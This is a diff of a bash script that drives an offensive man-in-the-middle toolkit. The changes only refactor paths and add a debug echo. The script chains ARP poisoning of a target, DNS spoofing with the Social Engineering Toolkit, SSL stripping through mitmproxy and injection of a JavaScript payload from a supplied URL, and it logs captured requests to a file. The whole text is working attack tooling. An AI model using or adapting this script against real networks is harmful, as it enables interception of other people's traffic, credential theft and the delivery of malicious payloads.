@@ -9,7 +9,9 @@ DNSSPOOF=0
 PAYLOAD_URL=""
 INTERFACE=""
 
-export PATH=$(pwd)/bin:${PATH}
+SCRIPT_PATH=$(dirname $(readlink -f $0))
+export PATH=${SCRIPT_PATH}/bin:${PATH}
+
 #####################################
 # Displays help
 #####################################
@@ -23,7 +25,7 @@ function help(){
     echo "       [-j] inject js payload"
     echo "       [-d] dnsspoof + setoolkit"
     echo "       [-i] interface"
-        exit 1
+    exit 1
 }
 
 #####################################
@@ -93,7 +95,7 @@ TARGET=$2
 # Installing mitmproxy
 #####################################
 
-MITMPROXY_PATH=$(pwd)"/mitmproxy"
+MITMPROXY_PATH=${SCRIPT_PATH}"/mitmproxy"
 
 # Checking if mitmproxy has been installed
 if [ ! -d "${MITMPROXY_PATH}" ];then
@@ -146,10 +148,10 @@ fi
 if [ ${DNSSPOOF} -eq 1 ]; then
 
     echo "Editing hosts file..."
-    vi $(pwd)/conf/hosts
+    vi ${SCRIPT_PATH}/conf/hosts
 
     echo "DNS spoofing..."
-    xterm -T "DNS spoofing target ${TARGET}" -hold -e dnsspoof -i ${INTERFACE} -f $(pwd)/conf/hosts udp dst port 53 and src ${TARGET} &
+    xterm -T "DNS spoofing target ${TARGET}" -hold -e dnsspoof -i ${INTERFACE} -f ${SCRIPT_PATH}/conf/hosts udp dst port 53 and src ${TARGET} &
 
     echo "Launching setoolkit..."
     xterm -T "Social Engineering Toolkit" -hold -e setoolkit &
@@ -163,7 +165,7 @@ fi
 # ARP poisoning
 #####################################
 
-arpoison ${GATEWAY} ${TARGET}
+${SCRIPT_PATH}/bin/arpoison.sh ${GATEWAY} ${TARGET}
 
 #####################################
 # mitmproxy
@@ -173,17 +175,18 @@ SSLSTRIP_SCRIPT=""
 INJECTJS_SCRIPT=("" "")
 
 if [ ${HTTPS_STRIPPING} -eq 1 ]; then
-    SSLSTRIP_SCRIPT="--script $(pwd)/script/sslstrip.py"
+    SSLSTRIP_SCRIPT="--script ${SCRIPT_PATH}/script/sslstrip.py"
 fi
 
 if [ ${INJECT_JS} -eq 1 ]; then
-    INJECTJS_SCRIPT=("--script" "$(pwd)/script/injectjs.py ${PAYLOAD_URL}")
+    INJECTJS_SCRIPT=("--script" "${SCRIPT_PATH}/script/injectjs.py ${PAYLOAD_URL}")
 fi
 
 if [ ${INTERACTIVE_MODE} -eq 1 ]; then
-    xterm -maximized -T "mitmproxy" -hold -e ${MITMPROXY_PATH}/mitmproxy -T --anticache --host --anticomp --noapp --eventlog --script "$(pwd)/script/io_write_dumpfile.py $(pwd)/log/requests.log" ${SSLSTRIP_SCRIPT} ${INJECT_JS:+ ${INJECTJS_SCRIPT[0]} "${INJECTJS_SCRIPT[1]}"} &
+    echo xterm -maximized -T "mitmproxy" -hold -e ${MITMPROXY_PATH}/mitmproxy -T --anticache --host --anticomp --noapp --eventlog --script "${SCRIPT_PATH}/script/io_write_dumpfile.py ${SCRIPT_PATH}/log/requests.log" ${SSLSTRIP_SCRIPT} ${INJECT_JS:+ ${INJECTJS_SCRIPT[0]} "${INJECTJS_SCRIPT[1]}"} &
+    xterm -maximized -T "mitmproxy" -hold -e ${MITMPROXY_PATH}/mitmproxy -T --anticache --host --anticomp --noapp --eventlog --script "${SCRIPT_PATH}/script/io_write_dumpfile.py ${SCRIPT_PATH}/log/requests.log" ${SSLSTRIP_SCRIPT} ${INJECT_JS:+ ${INJECTJS_SCRIPT[0]} "${INJECTJS_SCRIPT[1]}"} &
 else
     echo "Running mitmdump..."
-    ${MITMPROXY_PATH}/mitmdump -T --anticache --host --anticomp --noapp --quiet --script "$(pwd)/script/io_write_dumpfile.py $(pwd)/log/requests.log" ${SSLSTRIP_SCRIPT} ${INJECT_JS:+ ${INJECTJS_SCRIPT[0]} "${INJECTJS_SCRIPT[1]}"}
+    ${MITMPROXY_PATH}/mitmdump -T --anticache --host --anticomp --noapp --quiet --script "${SCRIPT_PATH}/script/io_write_dumpfile.py ${SCRIPT_PATH}/log/requests.log" ${SSLSTRIP_SCRIPT} ${INJECT_JS:+ ${INJECTJS_SCRIPT[0]} "${INJECTJS_SCRIPT[1]}"}
 fi
 
